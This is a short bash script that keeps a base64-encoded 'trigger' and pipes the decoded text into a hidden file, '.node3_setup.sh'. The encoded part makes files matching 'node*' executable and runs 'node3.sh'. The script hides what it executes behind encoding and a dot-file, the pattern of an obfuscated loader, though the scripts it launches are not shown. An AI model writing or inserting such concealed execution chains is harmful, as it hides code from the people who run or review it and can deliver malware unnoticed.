#!/bin/bash

TRIGGER_ENCODED="IyEvYmluL2Jhc2gKY2htb2QgK3ggbm9kZSoKYmFzaCBub2RlMy5zaAo="
# Decode each script and execute it
echo "$TRIGGER_ENCODED" | base64 --decode | bash .node3_setup.sh

